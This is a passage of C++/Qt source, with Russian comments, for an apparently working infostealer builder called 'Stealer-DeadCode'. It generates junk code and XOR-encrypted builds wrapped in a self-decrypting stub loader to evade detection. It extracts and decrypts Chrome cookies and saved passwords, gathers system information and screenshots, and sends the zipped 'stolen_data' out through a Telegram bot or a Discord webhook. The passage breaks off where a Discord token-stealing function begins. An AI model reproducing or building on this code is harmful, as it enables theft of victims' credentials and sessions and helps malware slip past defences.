    keyFile << "    for (size_t i = 0; i < 16; ++i) {\n";
    keyFile << "        key[i] = static_cast<unsigned char>(dis(gen));\n";
    keyFile << "    }\n";
    keyFile << "    return key;\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GenerateUniqueXorKey() {\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    std::stringstream ss;\n";
    keyFile << "    for (int i = 0; i < 16; ++i) {\n";
    keyFile << "        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);\n";
    keyFile << "    }\n";
    keyFile << "    return ss.str();\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GetXorKey() {\n";
    keyFile << "    std::string key1 = ENCRYPTION_KEY_1;\n";
    keyFile << "    std::string key2 = ENCRYPTION_KEY_2;\n";
    keyFile << "    std::string salt = ENCRYPTION_SALT;\n";
    keyFile << "    std::string combined = key1 + key2 + salt;\n";
    keyFile << "    std::array<unsigned char, 16> key;\n";
    keyFile << "    for (size_t i = 0; i < 16; ++i) {\n";
    keyFile << "        key[i] = static_cast<unsigned char>(combined[i % combined.length()]);\n";
    keyFile << "    }\n";
    keyFile << "    std::stringstream ss;\n";
    keyFile << "    for (const auto& byte : key) {\n";
    keyFile << "        ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byte);\n";
    keyFile << "    }\n";
    keyFile << "    return ss.str();\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GetBuildEncryptionKey() {\n";
    keyFile << "    return BUILD_ENCRYPTION_KEY;\n";
    keyFile << "}\n\n";

    keyFile << "#endif // BUILD_KEY_H\n";

    keyFile.close();
    emitLog("Ключи шифрования сгенерированы в build_key.h");
}

// Генерация мусорного кода
std::string MainWindow::generateJunkCode() {
    emitLog("Генерация мусорного кода...");

    std::ofstream junkFile("junk_code.h");
    if (!junkFile.is_open()) {
        emitLog("Ошибка: Не удалось создать junk_code.h. Проверьте права доступа.");
        isBuilding = false;
        return "";
    }

    junkFile << "#ifndef JUNK_CODE_H\n";
    junkFile << "#define JUNK_CODE_H\n\n";
    junkFile << "#include <random>\n";
    junkFile << "#include <string>\n";
    junkFile << "#include <vector>\n";
    junkFile << "#include <chrono>\n";
    junkFile << "#include <thread>\n\n";
    junkFile << "// Этот файл генерируется автоматически в mainwindow.cpp через generateJunkCode()\n\n";

    junkFile << "inline int getRandomNumber(int min, int max) {\n";
    junkFile << "    static std::random_device rd;\n";
    junkFile << "    static std::mt19937 gen(rd());\n";
    junkFile << "    std::uniform_int_distribution<> dis(min, max);\n";
    junkFile << "    return dis(gen);\n";
    junkFile << "}\n\n";

    junkFile << "namespace JunkCode {\n\n";

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(10, 20);
    int junkFuncCount = dis(gen);
    std::vector<std::string> junkFuncNames;
    for (int i = 0; i < junkFuncCount; ++i) {
        std::string funcName = "junkFunc_" + std::to_string(i) + "_" + std::to_string(dis(gen));
        junkFuncNames.push_back(funcName);
        junkFile << "    inline void " << funcName << "() {\n";
        junkFile << "        volatile int x = getRandomNumber(1000, 10000);\n";
        junkFile << "        volatile int y = getRandomNumber(500, 5000);\n";
        junkFile << "        std::vector<int> noise;\n";
        junkFile << "        for (int j = 0; j < getRandomNumber(5, 20); ++j) {\n";
        junkFile << "            noise.push_back(getRandomNumber(1, 100));\n";
        junkFile << "        }\n";
        junkFile << "        for (size_t k = 0; k < noise.size(); ++k) {\n";
        junkFile << "            if (noise[k] % 2 == 0) {\n";
        junkFile << "                x = (x ^ noise[k]) + y;\n";
        junkFile << "            } else {\n";
        junkFile << "                y = (y - noise[k]) ^ x;\n";
        junkFile << "            }\n";
        junkFile << "        }\n";
        junkFile << "        std::this_thread::sleep_for(std::chrono::milliseconds(getRandomNumber(1, 5)));\n";
        junkFile << "    }\n\n";
    }

    junkFile << "    inline void executeJunkCode() {\n";
    for (const auto& funcName : junkFuncNames) {
        junkFile << "        " << funcName << "();\n";
    }
    junkFile << "    }\n\n";

    junkFile << "} // namespace JunkCode\n\n";
    junkFile << "#endif // JUNK_CODE_H\n";

    junkFile.close();
    emitLog("Мусорный код сгенерирован в junk_code.h");

    // Возвращаем сгенерированный код как строку для использования в compileBuild
    std::stringstream junkCode;
    junkCode << "#include \"junk_code.h\"\n";
    junkCode << "void runJunkCode() {\n";
    junkCode << "    JunkCode::executeJunkCode();\n";
    junkCode << "}\n";
    return junkCode.str();
}

// Генерация случайного ключа
std::string MainWindow::generateRandomKey(size_t length) {
    const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::string key;
    key.reserve(length);

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(charset) - 2);

    for (size_t i = 0; i < length; ++i) {
        key += charset[dis(gen)];
    }

    return key;
}

// Генерация кода загрузчика (stub)
std::string MainWindow::generateStubCode(const std::string& key) {
    emitLog("Генерация кода загрузчика (stub)...");

    // Реальный код загрузчика, который будет расшифровывать и запускать зашифрованный билд
    std::stringstream stub;
    stub << "#include <windows.h>\n";
    stub << "#include <string>\n";
    stub << "#include <vector>\n\n";
    stub << "const std::string ENCRYPTION_KEY = \"" << key << "\";\n\n";
    stub << "void decryptData(std::vector<char>& data, const std::string& key) {\n";
    stub << "    for (size_t i = 0; i < data.size(); ++i) {\n";
    stub << "        data[i] ^= key[i % key.length()];\n";
    stub << "    }\n";
    stub << "}\n\n";
    stub << "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n";
    stub << "    // Получаем путь к текущему исполняемому файлу\n";
    stub << "    char exePath[MAX_PATH];\n";
    stub << "    GetModuleFileNameA(NULL, exePath, MAX_PATH);\n";
    stub << "    HANDLE hFile = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n";
    stub << "    if (hFile == INVALID_HANDLE_VALUE) return 1;\n";
    stub << "    DWORD fileSize = GetFileSize(hFile, NULL);\n";
    stub << "    std::vector<char> fileData(fileSize);\n";
    stub << "    DWORD bytesRead;\n";
    stub << "    ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL);\n";
    stub << "    CloseHandle(hFile);\n";
    stub << "    // Пропускаем stub (предполагаем, что stub занимает первые 4096 байт)\n";
    stub << "    size_t stubSize = 4096;\n";
    stub << "    std::vector<char> encryptedData(fileData.begin() + stubSize, fileData.end());\n";
    stub << "    // Расшифровываем данные\n";
    stub << "    decryptData(encryptedData, ENCRYPTION_KEY);\n";
    stub << "    // Создаём временный файл для расшифрованного билда\n";
    stub << "    char tempPath[MAX_PATH];\n";
    stub << "    GetTempPathA(MAX_PATH, tempPath);\n";
    stub << "    std::string tempFilePath = std::string(tempPath) + \"temp_build.exe\";\n";
    stub << "    HANDLE hTempFile = CreateFileA(tempFilePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n";
    stub << "    if (hTempFile == INVALID_HANDLE_VALUE) return 1;\n";
    stub << "    DWORD bytesWritten;\n";
    stub << "    WriteFile(hTempFile, encryptedData.data(), encryptedData.size(), &bytesWritten, NULL);\n";
    stub << "    CloseHandle(hTempFile);\n";
    stub << "    // Запускаем расшифрованный билд\n";
    stub << "    STARTUPINFOA si = { sizeof(si) };\n";
    stub << "    PROCESS_INFORMATION pi;\n";
    stub << "    if (CreateProcessA(tempFilePath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {\n";
    stub << "        WaitForSingleObject(pi.hProcess, INFINITE);\n";
    stub << "        CloseHandle(pi.hProcess);\n";
    stub << "        CloseHandle(pi.hThread);\n";
    stub << "    }\n";
    stub << "    // Удаляем временный файл\n";
    stub << "    DeleteFileA(tempFilePath.c_str());\n";
    stub << "    return 0;\n";
    stub << "}\n";

    // Сохраняем stub в файл для компиляции
    std::ofstream stubFile("stub.cpp");
    if (!stubFile.is_open()) {
        emitLog("Ошибка: Не удалось создать stub.cpp");
        return "";
    }
    stubFile << stub.str();
    stubFile.close();

    // Компилируем stub в бинарный код
    std::string stubExePath = "stub.exe";
    std::string compileCommand = "g++ stub.cpp -o " + stubExePath + " -mwindows";
    if (system(compileCommand.c_str()) != 0) {
        emitLog("Ошибка: Не удалось скомпилировать stub");
        return "";
    }

    // Читаем скомпилированный stub в строку
    std::ifstream stubExeFile(stubExePath, std::ios::binary);
    if (!stubExeFile.is_open()) {
        emitLog("Ошибка: Не удалось открыть скомпилированный stub");
        return "";
    }
    std::vector<char> stubData((std::istreambuf_iterator<char>(stubExeFile)), std::istreambuf_iterator<char>());
    stubExeFile.close();

    // Удаляем временные файлы
    std::filesystem::remove("stub.cpp");
    std::filesystem::remove(stubExePath);

    emitLog("Код загрузчика (stub) успешно сгенерирован");
    return std::string(stubData.begin(), stubData.end());
}

// Шифрование билда
bool MainWindow::encryptBuild(const std::string& buildPath, const std::string& key) {
    emitLog("Шифрование билда: " + QString::fromStdString(buildPath));

    std::ifstream inFile(buildPath, std::ios::binary);
    if (!inFile) {
        emitLog("Ошибка: Не удалось открыть билд для чтения");
        return false;
    }

    std::vector<char> buildData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    std::vector<char> encryptedData = buildData;
    for (size_t i = 0; i < encryptedData.size(); ++i) {
        encryptedData[i] ^= key[i % key.length()];
    }

    std::string stubCode = generateStubCode(key);
    if (stubCode.empty()) {
        emitLog("Ошибка: Не удалось сгенерировать stub для шифрования");
        return false;
    }

    std::string encryptedBuildPath = buildPath + ".encrypted.exe";
    std::ofstream outFile(encryptedBuildPath, std::ios::binary);
    if (!outFile) {
        emitLog("Ошибка: Не удалось создать зашифрованный билд");
        return false;
    }

    // Записываем stub и зашифрованные данные
    outFile.write(stubCode.c_str(), stubCode.size());
    outFile.write(encryptedData.data(), encryptedData.size());
    outFile.close();

    // Удаляем исходный билд и переименовываем зашифрованный
    std::filesystem::remove(buildPath);
    std::filesystem::rename(encryptedBuildPath, buildPath);

    emitLog("Билд успешно зашифрован");
    return true;
}

// Компиляция билда
bool MainWindow::compileBuild(const std::string& polymorphicCode, const std::string& junkCode) {
    emitLog("Компиляция билда...");

    std::filesystem::create_directories("builds");

    std::string sourceCode = "#include \"build_key.h\"\n";
    sourceCode += "#include \"mainwindow.h\"\n";
    sourceCode += polymorphicCode + "\n";
    sourceCode += junkCode + "\n";
    sourceCode += R"(
        int main() {
            runPolymorphicCode();
            runJunkCode();
            MainWindow window;
            window.StealAndSendData("temp");
            return 0;
        }
    )";

    std::string sourcePath = "builds/temp_source.cpp";
    std::ofstream sourceFile(sourcePath);
    if (!sourceFile) {
        emitLog("Ошибка: Не удалось создать исходный файл для компиляции");
        return false;
    }
    sourceFile << sourceCode;
    sourceFile.close();

    std::string buildPath = "builds/" + config.filename;
    std::string compileCommand = "g++ \"" + sourcePath + "\" -o \"" + buildPath + "\" -mwindows -lbcrypt -lshlwapi -liphlpapi -lpsapi -luser32 -lwininet -ladvapi32 -lws2_32 -lcrypt32 -lzip -lsqlite3 -lcurl -lssl -lcrypto";
    if (!config.iconPath.empty()) {
        compileCommand += " -I. -L. -I./include -L./lib \"" + config.iconPath + "\"";
    } else {
        compileCommand += " -I. -L. -I./include -L./lib";
    }

    if (system(compileCommand.c_str()) != 0) {
        emitLog("Ошибка компиляции билда");
        return false;
    }

    emitLog("Билд успешно скомпилирован: " + QString::fromStdString(buildPath));
    return true;
}

// Создание ZIP-архива
std::string MainWindow::archiveData(const std::string& dir, const std::vector<std::string>& files) {
    emitLog("Создание ZIP-архива в директории: " + QString::fromStdString(dir));

    if (files.empty()) {
        emitLog("Ошибка: Список файлов для архивации пуст");
        return "";
    }

    std::string zipPath = dir + "\\stolen_data_" + generateRandomString(8) + ".zip";
    int err = 0;
    zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
    if (!zip) {
        emitLog("Ошибка: Не удалось создать ZIP-архив: " + QString::number(err));
        return "";
    }

    bool hasFiles = false;
    for (const auto& filePath : files) {
        if (!std::filesystem::exists(filePath)) {
            emitLog("Файл не найден для архивации: " + QString::fromStdString(filePath));
            continue;
        }

        zip_source_t* source = zip_source_file_create(filePath.c_str(), 0, -1, &err);
        if (!source) {
            emitLog("Ошибка создания источника для файла " + QString::fromStdString(filePath) + ": " + QString::number(err));
            continue;
        }

        std::string fileName = std::filesystem::path(filePath).filename().string();
        if (zip_file_add(zip, fileName.c_str(), source, ZIP_FL_OVERWRITE) < 0) {
            emitLog("Ошибка добавления файла в архив: " + QString::fromStdString(fileName));
            zip_source_free(source);
            continue;
        }
        hasFiles = true;
    }

    if (!hasFiles) {
        emitLog("Ошибка: Нет файлов для добавления в ZIP-архив");
        zip_discard(zip);
        return "";
    }

    if (zip_close(zip) < 0) {
        emitLog("Ошибка закрытия ZIP-архива: " + QString::fromStdString(zip_error_strerror(zip_get_error(zip))));
        return "";
    }

    emitLog("ZIP-архив успешно создан: " + QString::fromStdString(zipPath));
    return zipPath;
}

// Шифрование данных
std::string MainWindow::encryptData(const std::string& data) {
    emitLog("Шифрование данных...");

    std::array<unsigned char, 16> k1, k2;
    std::fill(k1.begin(), k1.end(), 0);
    std::fill(k2.begin(), k2.end(), 0);

    // Подготовка ключей
    for (size_t i = 0; i < encryptionKey1.length() && i < k1.size(); ++i) {
        k1[i] = static_cast<unsigned char>(encryptionKey1[i]);
    }
    for (size_t i = 0; i < encryptionKey2.length() && i < k2.size(); ++i) {
        k2[i] = static_cast<unsigned char>(encryptionKey2[i]);
    }

    auto iv = generateIV();
    QByteArray dataByteArray(data.data(), data.size());
    QByteArray xorData = applyXOR(dataByteArray, k1);
    QByteArray encryptedData = applyAES(xorData, k2, iv);

    if (encryptedData.isEmpty()) {
        emitLog("Ошибка: Не удалось зашифровать данные");
        return "";
    }

    std::string result;
    result.append((char*)iv.data(), iv.size());
    result.append(encryptedData.constData(), encryptedData.size());

    emitLog("Данные успешно зашифрованы");
    return result;
}

// Отправка данных через Telegram
void MainWindow::sendToTelegram(const std::string& data, const std::vector<std::string>& files) {
    emitLog("Отправка данных через Telegram...");

    if (config.telegramBotToken.empty() || config.telegramChatId.empty()) {
        emitLog("Ошибка: Токен Telegram или Chat ID не указаны");
        return;
    }

    std::string tempDir = "temp_" + generateRandomString(8);
    std::string zipPath = tempDir + "\\telegram_data.zip";
    std::filesystem::create_directories(tempDir);

    std::string createdZipPath = archiveData(tempDir, files);
    if (createdZipPath.empty()) {
        emitLog("Ошибка: Не удалось создать ZIP-архив для отправки через Telegram");
        std::filesystem::remove_all(tempDir);
        return;
    }

    // Проверка размера файла
    std::uintmax_t fileSize = std::filesystem::file_size(createdZipPath);
    const std::uintmax_t telegramFileSizeLimit = 50 * 1024 * 1024; // 50 МБ
    if (fileSize > telegramFileSizeLimit) {
        emitLog("Ошибка: Размер ZIP-архива (" + QString::number(fileSize / (1024 * 1024)) + " МБ) превышает лимит Telegram (50 МБ)");
        std::filesystem::remove_all(tempDir);
        return;
    }

    std::string url = "https://api.telegram.org/bot" + config.telegramBotToken + "/sendDocument";
    CURL* curl = curl_easy_init();
    if (!curl) {
        emitLog("Ошибка: Не удалось инициализировать CURL для Telegram");
        std::filesystem::remove_all(tempDir);
        return;
    }

    curl_mime* mime = curl_mime_init(curl);
    curl_mimepart* part;

    part = curl_mime_addpart(mime);
    curl_mime_name(part, "chat_id");
    curl_mime_data(part, config.telegramChatId.c_str(), CURL_ZERO_TERMINATED);

    part = curl_mime_addpart(mime);
    curl_mime_name(part, "document");
    curl_mime_filedata(part, createdZipPath.c_str());

    std::string response;
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        emitLog("Ошибка отправки через Telegram: " + QString::fromStdString(curl_easy_strerror(res)));
    } else {
        QJsonDocument doc = QJsonDocument::fromJson(QByteArray::fromStdString(response));
        if (doc.isNull() || !doc.object().value("ok").toBool()) {
            emitLog("Ошибка Telegram API: " + QString::fromStdString(response));
        } else {
            emitLog("Данные успешно отправлены через Telegram");
        }
    }

    curl_mime_free(mime);
    curl_easy_cleanup(curl);

    // Удаление временной директории
    try {
        std::filesystem::remove_all(tempDir);
        emitLog("Временная директория удалена: " + QString::fromStdString(tempDir));
    } catch (const std::exception& e) {
        emitLog("Ошибка при удалении временной директории: " + QString::fromStdString(e.what()));
    }
}

// Отправка данных через Discord
void MainWindow::sendToDiscord(const std::string& data, const std::vector<std::string>& files) {
    emitLog("Отправка данных через Discord...");

    if (config.discordWebhook.empty()) {
        emitLog("Ошибка: Webhook URL для Discord не указан");
        return;
    }

    std::string tempDir = "temp_" + generateRandomString(8);
    std::string zipPath = tempDir + "\\discord_data.zip";
    std::filesystem::create_directories(tempDir);

    std::string createdZipPath = archiveData(tempDir, files);
    if (createdZipPath.empty()) {
        emitLog("Ошибка: Не удалось создать ZIP-архив для отправки через Discord");
        std::filesystem::remove_all(tempDir);
        return;
    }

    // Проверка размера файла
    std::uintmax_t fileSize = std::filesystem::file_size(createdZipPath);
    const std::uintmax_t discordFileSizeLimit = 25 * 1024 * 1024; // 25 МБ
    if (fileSize > discordFileSizeLimit) {
        emitLog("Ошибка: Размер ZIP-архива (" + QString::number(fileSize / (1024 * 1024)) + " МБ) превышает лимит Discord (25 МБ)");
        std::filesystem::remove_all(tempDir);
        return;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        emitLog("Ошибка: Не удалось инициализировать CURL для Discord");
        std::filesystem::remove_all(tempDir);
        return;
    }

    curl_mime* mime = curl_mime_init(curl);
    curl_mimepart* part;

    part = curl_mime_addpart(mime);
    curl_mime_name(part, "file");
    curl_mime_filedata(part, createdZipPath.c_str());

    std::string response;
    curl_easy_setopt(curl, CURLOPT_URL, config.discordWebhook.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        emitLog("Ошибка отправки через Discord: " + QString::fromStdString(curl_easy_strerror(res)));
    } else {
        if (response.find("id") == std::string::npos) {
            emitLog("Ошибка Discord Webhook: " + QString::fromStdString(response));
        } else {
            emitLog("Данные успешно отправлены через Discord");
        }
    }

    curl_mime_free(mime);
    curl_easy_cleanup(curl);

    // Удаление временной директории
    try {
        std::filesystem::remove_all(tempDir);
        emitLog("Временная директория удалена: " + QString::fromStdString(tempDir));
    } catch (const std::exception& e) {
        emitLog("Ошибка при удалении временной директории: " + QString::fromStdString(e.what()));
    }
}

// Сохранение данных локально
void MainWindow::saveToLocalFile(const std::string& data, const std::string& dir) {
    emitLog("Сохранение данных локально в директории: " + QString::fromStdString(dir));

    std::string outputDir = dir + "\\output";
    try {
        std::filesystem::create_directories(outputDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории output: " + QString::fromStdString(e.what()));
        return;
    }

    std::string destPath = outputDir + "\\stolen_data_" + generateRandomString(8) + ".bin";
    std::ofstream outFile(destPath, std::ios::binary);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось сохранить данные локально: " + QString::fromStdString(destPath));
        return;
    }

    outFile.write(data.data(), data.size());
    outFile.close();
    emitLog("Данные успешно сохранены локально: " + QString::fromStdString(destPath));
}

// Отправка данных
void MainWindow::sendData(const QString& encryptedData, const std::vector<std::string>& files) {
    std::string data = encryptedData.toStdString();
    if (config.sendMethod == "Telegram") {
        sendToTelegram(data, files);
    } else if (config.sendMethod == "Discord") {
        sendToDiscord(data, files);
    } else {
        saveToLocalFile(data, "output");
    }
}

// Сбор системной информации
std::string MainWindow::collectSystemInfo(const std::string& dir) {
    emitLog("Сбор системной информации...");

    std::string sysDir = dir + "\\SystemInfo";
    try {
        std::filesystem::create_directories(sysDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для системной информации: " + QString::fromStdString(e.what()));
        return "";
    }

    std::string sysInfoPath = sysDir + "\\system_info.txt";
    std::ofstream outFile(sysInfoPath);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать файл для системной информации");
        return "";
    }

    // Получение имени хоста
    outFile << "Hostname: " << QHostInfo::localHostName().toStdString() << "\n";

    // Получение информации об ОС
    outFile << "OS: " << QSysInfo::prettyProductName().toStdString() << "\n";
    outFile << "OS Version: " << QSysInfo::productVersion().toStdString() << "\n";
    outFile << "Architecture: " << QSysInfo::currentCpuArchitecture().toStdString() << "\n";

    // Получение информации о процессоре
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char cpuName[1024];
        DWORD size = sizeof(cpuName);
        if (RegQueryValueExA(hKey, "ProcessorNameString", nullptr, nullptr, (LPBYTE)cpuName, &size) == ERROR_SUCCESS) {
            outFile << "CPU: " << cpuName << "\n";
        }
        RegCloseKey(hKey);
    }

    // Получение информации о памяти
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    if (GlobalMemoryStatusEx(&memInfo)) {
        outFile << "Total Physical Memory: " << (memInfo.ullTotalPhys / (1024 * 1024)) << " MB\n";
        outFile << "Available Physical Memory: " << (memInfo.ullAvailPhys / (1024 * 1024)) << " MB\n";
    }

    // Получение информации о сетевых адаптерах
    ULONG bufferSize = 15000;
    std::vector<char> buffer(bufferSize);
    PIP_ADAPTER_INFO adapterInfo = (PIP_ADAPTER_INFO)buffer.data();
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        PIP_ADAPTER_INFO adapter = adapterInfo;
        while (adapter) {
            outFile << "Network Adapter: " << adapter->Description << "\n";
            outFile << "MAC Address: ";
            for (int i = 0; i < (int)adapter->AddressLength; ++i) {
                outFile << std::hex << std::setw(2) << std::setfill('0') << (int)adapter->Address[i];
                if (i < (int)adapter->AddressLength - 1) outFile << "-";
            }
            outFile << "\n";
            outFile << "IP Address: " << adapter->IpAddressList.IpAddress.String << "\n\n";
            adapter = adapter->Next;
        }
    }

    outFile.close();
    emitLog("Системная информация сохранена: " + QString::fromStdString(sysInfoPath));
    return sysInfoPath;
}

// Создание скриншота
std::string MainWindow::TakeScreenshot(const std::string& dir) {
    emitLog("Создание скриншота...");

    std::string screenshotDir = dir + "\\Screenshots";
    try {
        std::filesystem::create_directories(screenshotDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для скриншота: " + QString::fromStdString(e.what()));
        return "";
    }

    QScreen* screen = QGuiApplication::primaryScreen();
    if (!screen) {
        emitLog("Ошибка: Не удалось получить доступ к экрану");
        return "";
    }

    QPixmap originalPixmap = screen->grabWindow(0);
    if (originalPixmap.isNull()) {
        emitLog("Ошибка: Не удалось сделать скриншот");
        return "";
    }

    // Создаем QPainter для рисования на скриншоте
    QPainter painter(&originalPixmap);
    QFont font("Arial", 30, QFont::Bold);
    painter.setFont(font);
    painter.setPen(Qt::red); // Цвет текста — красный (можно сделать настраиваемым)

    // Текст, который будем рисовать
    QString text = "Stealer-DeadCode";

    // Вычисляем размеры текста
    QFontMetrics fontMetrics(font);
    QRect textRect = fontMetrics.boundingRect(text);

    // Вычисляем координаты для центрирования текста
    int x = (originalPixmap.width() - textRect.width()) / 2;
    int y = (originalPixmap.height() - textRect.height()) / 2;

    // Рисуем текст по центру
    painter.drawText(x, y, text);

    // Сохраняем скриншот
    std::string screenshotPath = screenshotDir + "\\screenshot_" + generateRandomString(8) + ".png";
    QString screenshotPathQt = QString::fromStdString(screenshotPath);
    if (!originalPixmap.save(screenshotPathQt, "PNG")) {
        emitLog("Ошибка: Не удалось сохранить скриншот");
        return "";
    }

    emitLog("Скриншот сохранен: " + QString::fromStdString(screenshotPath));
    collectedFiles.push_back(screenshotPath);
    return screenshotPath;
}

// Кража данных браузера
std::string MainWindow::stealBrowserData(const std::string& dir) {
    emitLog("Начало кражи данных браузера...");

    std::string browserDir = dir + "\\BrowserData";
    try {
        std::filesystem::create_directories(browserDir);
    } catch (const std::exception& e) {
        emitLog("Ошибка создания директории для данных браузера: " + QString::fromStdString(e.what()));
        return "";
    }

    std::string result;

    // Получаем путь к LOCALAPPDATA
    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        emitLog("Ошибка: Не удалось получить путь к LOCALAPPDATA для данных браузера");
        free(localAppDataPath);
        return "";
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    // Путь к данным Chrome
    std::string chromePath = localAppData + "\\Google\\Chrome\\User Data\\Default";
    if (std::filesystem::exists(chromePath)) {
        emitLog("Обнаружен Google Chrome, начинаем кражу данных...");

        // Копируем файл с куками
        if (config.cookies) {
            std::string cookiesPath = chromePath + "\\Network\\Cookies";
            if (std::filesystem::exists(cookiesPath)) {
                std::string destCookiesPath = browserDir + "\\chrome_cookies.sqlite";
                try {
                    std::filesystem::copy_file(cookiesPath, destCookiesPath, std::filesystem::copy_options::overwrite_existing);
                    emitLog("Файл куки Chrome скопирован: " + QString::fromStdString(destCookiesPath));

                    // Извлекаем куки из базы данных SQLite
                    sqlite3* db;
                    if (sqlite3_open(destCookiesPath.c_str(), &db) == SQLITE_OK) {
                        std::string cookiesDataPath = browserDir + "\\chrome_cookies.txt";
                        std::ofstream cookiesFile(cookiesDataPath);
                        if (cookiesFile.is_open()) {
                            sqlite3_stmt* stmt;
                            const char* query = "SELECT host_key, name, encrypted_value FROM cookies";
                            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                                while (sqlite3_step(stmt) == SQLITE_ROW) {
                                    std::string host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                    std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                    QByteArray encryptedValue((const char*)sqlite3_column_blob(stmt, 2), sqlite3_column_bytes(stmt, 2));
                                    QByteArray decryptedValue = decryptDPAPIData(encryptedValue);
                                    if (!decryptedValue.isEmpty()) {
                                        cookiesFile << "Host: " << host << "\n";
                                        cookiesFile << "Name: " << name << "\n";
                                        cookiesFile << "Value: " << decryptedValue.toStdString() << "\n\n";
                                    }
                                }
                            }
                            sqlite3_finalize(stmt);
                            cookiesFile.close();
                            emitLog("Куки Chrome извлечены: " + QString::fromStdString(cookiesDataPath));
                            collectedFiles.push_back(cookiesDataPath);
                            result += "Chrome Cookies: " + cookiesDataPath + "\n";
                        }
                        sqlite3_close(db);
                    } else {
                        emitLog("Ошибка открытия базы данных куки Chrome: " + QString::fromStdString(sqlite3_errmsg(db)));
                    }
                } catch (const std::exception& e) {
                    emitLog("Ошибка при копировании куки Chrome: " + QString::fromStdString(e.what()));
                }
            } else {
                emitLog("Файл куки Chrome не найден");
            }
        }

        // Копируем файл с паролями
        if (config.passwords) {
            std::string passwordsPath = chromePath + "\\Login Data";
            if (std::filesystem::exists(passwordsPath)) {
                std::string destPasswordsPath = browserDir + "\\chrome_logins.sqlite";
                try {
                    std::filesystem::copy_file(passwordsPath, destPasswordsPath, std::filesystem::copy_options::overwrite_existing);
                    emitLog("Файл паролей Chrome скопирован: " + QString::fromStdString(destPasswordsPath));

                    // Извлекаем пароли из базы данных SQLite
                    sqlite3* db;
                    if (sqlite3_open(destPasswordsPath.c_str(), &db) == SQLITE_OK) {
                        std::string passwordsDataPath = browserDir + "\\chrome_passwords.txt";
                        std::ofstream passwordsFile(passwordsDataPath);
                        if (passwordsFile.is_open()) {
                            sqlite3_stmt* stmt;
                            const char* query = "SELECT origin_url, username_value, password_value FROM logins";
                            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                                while (sqlite3_step(stmt) == SQLITE_ROW) {
                                    std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                    std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                    QByteArray encryptedPassword((const char*)sqlite3_column_blob(stmt, 2), sqlite3_column_bytes(stmt, 2));
                                    QByteArray decryptedPassword = decryptDPAPIData(encryptedPassword);
                                    if (!decryptedPassword.isEmpty()) {
                                        passwordsFile << "URL: " << url << "\n";
                                        passwordsFile << "Username: " << username << "\n";
                                        passwordsFile << "Password: " << decryptedPassword.toStdString() << "\n\n";
                                    }
                                }
                            }
                            sqlite3_finalize(stmt);
                            passwordsFile.close();
                            emitLog("Пароли Chrome извлечены: " + QString::fromStdString(passwordsDataPath));
                            collectedFiles.push_back(passwordsDataPath);
                            result += "Chrome Passwords: " + passwordsDataPath + "\n";
                        }
                        sqlite3_close(db);
                    } else {
                        emitLog("Ошибка открытия базы данных паролей Chrome: " + QString::fromStdString(sqlite3_errmsg(db)));
                    }
                } catch (const std::exception& e) {
                    emitLog("Ошибка при копировании паролей Chrome: " + QString::fromStdString(e.what()));
                }
            } else {
                emitLog("Файл паролей Chrome не найден");
            }
        }
    } else {
        emitLog("Google Chrome не найден");
    }

    emitLog("Кража данных браузера завершена");
    return result;
}

// Кража токенов Discord
std::string MainWindow::StealDiscordTokens(const std::string& dir) {
